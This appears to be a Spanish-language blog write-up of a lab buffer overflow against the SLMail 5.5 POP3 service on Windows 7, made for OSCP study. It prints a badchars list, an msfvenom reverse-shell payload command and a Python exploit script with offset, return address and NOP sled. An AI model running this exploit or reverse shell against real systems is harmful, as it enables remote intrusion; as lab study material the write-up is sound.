---
layout: single
title: Buffer OverFlow a SLMail 5.5
excerpt: "En esta publicacion detallo mi practica a un Buffer OverFlow usando Python3 para la ejecucion remota de comandos RCE a bajo nivel, y persistencia en un sistema Windows 7 de 32 bits."
date: 2023-07-28
classes: wide
header:
  teaser: /assets/images/BOF-SLMail/script.png
  teaser_home_page: true
categories:
  - BOF
  - Scripts
tags:
  - Python
  - Scripting
  - Windows 7
  - Buffer Overflow
---
## Practica Buffer OverFlow con Python3

Lo primero es configurar una maquina Windows para montar el entorno de practica, y es importante que este bien configurado para tener comunicacion entre maquinas `(La maquina Windows con el binario vulnerable, y nuestra maquina de atacante).`

> *Se usara un sistema Windows 7 de 32 bits, la version starter.*

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/W7.png" alt="bof" width="2000" oncontextmenu="return false;">
</div>

```

```
Despues de instalar la maquina Windows, es muy importante que haya comunicacion entre las 2 maquinas mediante trazas **ICMP**, para lograr esta configuracion debemos ir a la configuracion avanzada de firewall de Windows y habilitar las reglas de entrada y de salida la comunicacion por iPv4 y por iPv6:

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/ReglasEntrada.png" alt="bof" width="2000" oncontextmenu="return false;">
</div>

> En la imagen se muestran las reglas de entrada donde hay que habilitar las 4 reglas para poder recibir una comunicacion de nuestra maquina de atacante, de esta forma habra una comunicacion, por tanto hay que repetir el proceso para las reglas de salida:

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/reglasSalida.png" alt="bof" width="2000" oncontextmenu="return false;">
</div>

Una vez con las reglas habilitadas probamos la comunicacion:

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/PruebaPing.png" alt="bof" width="2000" oncontextmenu="return false;">
</div>

Al enviar 4 paquetes y recibirlos confirma que hay comunicacion entre maquinas completando el primer paso para dar inicio a la practica del BufferOverflow.

## Badchars

Son necesarios para evitar conflictos al momento de crear nuestra shellcode y que el registro ESP pueda interpretar
nuestro codigo y proporcionarnos nuestra reverse shell, o el comando que queramos inyectar en el sistema.

```
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

## Codigo del Script

Bof a Slmail 5.5

Para conseguir el shellcode se puede hacer uso de la herramienta msfvenom:

> msfvenom -p windows/shell_reverse_tcp LHOST=tuDireccionIP LPORT=443 -a x86 --platform windows -b "Aqui van los badChards" -e x86/shikata_ga_nai -f c


> El script esta hecho en python3


```python
#!/usr/bin/python
# Autor liandd
from pwn import *
from struct import pack
import socket, sys

def exploit(ip_address, rport):
    # Escapar el shellcode con b para indicar que son bytes
    shellcode= (b"\ejemplo")

    buffer = b"A" * 2606 + pack("<L", 0x5f4a358f) + b"\x90"*16 + shellcode
    
    p1 = log.progress("Data")
    try:
        p1.status("Enviando %s bytes" % len(buffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        s.recv(1024)
        s.send(b'USER eva\r\n')
        s.recv(1024)
        s.send(b'PASS ' + buffer + b'\r\n')
        s.recv(1024)
    except Exception as e:
        print("\n[!] Ha habido un error de conexión:", e)
        sys.exit(0)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print ("\n[!] Uso : python " + sys.argv[0] + " <ip-address>\n")
        sys.exit(0)

    ip_address = sys.argv[1]
    rport = 110

    exploit(ip_address, rport)
```

El Script es compilado y funciona correctamente:

<div style="text-align: center;">
  <img src="/assets/images/BOF-SLMail/BOFF.png" alt="resultbof" width="2000" oncontextmenu="return false;">
</div>
---

Esta publicacion ha sido creada como soporte en el aprendizaje de BufferOverFlow para la OSCP

Lian